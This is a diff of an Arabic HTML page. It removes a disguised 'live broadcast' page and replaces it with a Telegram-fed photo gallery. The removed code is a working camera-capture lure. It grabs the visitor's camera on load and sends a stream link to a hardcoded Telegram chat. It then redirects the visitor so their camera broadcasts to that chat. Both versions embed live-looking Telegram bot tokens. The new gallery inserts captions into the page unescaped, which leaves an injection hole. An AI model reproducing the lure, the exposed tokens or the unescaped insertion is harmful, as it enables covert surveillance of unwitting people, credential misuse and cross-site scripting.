@@ -1,62 +1,163 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الحارس - البث الفوري 🛡️</title>
+    <title>معرض مصعب للصور</title>
     <style>
-        body { background: #020617; color: white; text-align: center; font-family: sans-serif; padding: 20px; }
-        .box { background: #1e293b; border-radius: 25px; padding: 20px; max-width: 450px; margin: auto; border: 1px solid #334155; }
-        video { width: 100%; border-radius: 15px; background: #000; border: 2px solid #3b82f6; }
-        .btn-final { 
-            background: #ef4444; color: white; width: 100%; padding: 20px; border-radius: 15px; 
-            border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; margin-top: 20px;
+        :root {
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-color: #262626;
+            --accent-color: #0095f6;
         }
-        #msg { color: #fbbf24; margin-top: 15px; font-weight: bold; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header {
+            width: 100%;
+            background: white;
+            padding: 20px 0;
+            border-bottom: 1px solid #dbdbdb;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        h1 { margin: 0; font-size: 1.5rem; color: var(--text-color); }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .refresh-btn {
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .post {
+            background: var(--card-bg);
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+
+        .post img {
+            width: 100%;
+            display: block;
+            max-height: 500px;
+            object-fit: cover;
+        }
+
+        .post-content {
+            padding: 15px;
+            text-align: right;
+        }
+
+        .post-content .username {
+            font-weight: bold;
+            margin-left: 8px;
+        }
+
+        .post-content .caption {
+            font-size: 0.95rem;
+            color: #444;
+            line-height: 1.5;
+        }
+
+        #loader { color: #8e8e8e; margin: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h3>نظام البث المباشر (إصدار تخطي الحجب)</h3>
-        <video id="p" autoplay playsinline muted></video>
-        <button class="btn-final" onclick="launchStream()">🎬 تشغيل الفيديو الآن</button>
-        <div id="msg">جاهز لإرسال الرابط..</div>
+    <header>
+        <h1>Galerie Mousaab 🌿</h1>
+    </header>
+
+    <div class="container">
+        <button class="refresh-btn" onclick="loadGallery()">تحديث المعرض 🔄</button>
+        <div id="loader">جاري جلب الصور من تيليجرام...</div>
+        <div id="gallery"></div>
     </div>
 
     <script>
-        const TOKEN = "8799708539:AAFFvqiwSvFBTACNrnZtOO5noYErlLsc958";
-        const CHAT_ID = "1734714029";
-        let stream = null;
+        const TOKEN = '8649626005:AAHeOrH0UC4uqu7GSqc7d3NiP_86Ph0Dcpg';
 
-        async function start() {
+        async function loadGallery() {
+            const gallery = document.getElementById('gallery');
+            const loader = document.getElementById('loader');
+            loader.style.display = 'block';
+
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: 480 } });
-                document.getElementById('p').srcObject = stream;
-            } catch (e) { document.getElementById('msg').innerText = "خطأ في الكاميرا"; }
+                // جلب آخر 50 تحديث من البوت
+                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-50`);
+                const data = await response.json();
+
+                if (data.ok && data.result.length > 0) {
+                    gallery.innerHTML = "";
+                    loader.style.display = 'none';
+
+                    // ترتيب الصور (الأحدث أولاً)
+                    const updates = data.result.reverse();
+
+                    for (let item of updates) {
+                        const msg = item.message || item.channel_post;
+                        
+                        if (msg && msg.photo) {
+                            // جلب معرف الصورة (أعلى دقة)
+                            const fileId = msg.photo[msg.photo.length - 1].file_id;
+                            const caption = msg.caption || "لا يوجد وصف لهذه الصورة.";
+
+                            // جلب رابط الصورة المباشر
+                            const fileRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getFile?file_id=${fileId}`);
+                            const fileData = await fileRes.json();
+
+                            if (fileData.ok) {
+                                const imgUrl = `https://api.telegram.org/file/bot${TOKEN}/${fileData.result.file_path}`;
+                                
+                                // بناء هيكل المنشور (صورة + وصف)
+                                const postHTML = `
+                                    <div class="post">
+                                        <img src="${imgUrl}" alt="Nature">
+                                        <div class="post-content">
+                                            <span class="username">Mousaab:</span>
+                                            <span class="caption">${caption}</span>
+                                        </div>
+                                    </div>`;
+                                gallery.innerHTML += postHTML;
+                            }
+                        }
+                    }
+                } else {
+                    loader.innerText = "المعرض فارغ، أرسل صورة للبوت مع وصف لتظهر هنا.";
+                }
+            } catch (error) {
+                loader.innerText = "حدث خطأ أثناء الاتصال بالقاعدة.";
+                console.error(error);
+            }
         }
 
-        async function launchStream() {
-            document.getElementById('msg').innerText = "⏳ جاري كسر الجمود..";
-            const id = "LIVE_" + Math.floor(Math.random() * 9999);
-            
-            // روابط "الاختراق" - تستخدم أقل جودة ممكنة لضمان العبور
-            const push = `https://vdo.ninja/?push=${id}&autostart&clean&mute&bitrate=500&fps=15&vcodec=vp8&noap&buffer=0`;
-            const view = `https://vdo.ninja/?view=${id}&autoplay=1&noap&buffer=0&vp8`;
-
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `🎬 **رابط الفيديو (الوضع السريع):**\n${view}` })
-            });
-
-            if (stream) stream.getTracks().forEach(t => t.stop());
-
-            setTimeout(() => {
-                window.location.replace(push);
-            }, 500);
-        }
-        start();
+        // تحميل المعرض عند فتح الصفحة
+        window.onload = loadGallery;
     </script>
 </body>
 </html>
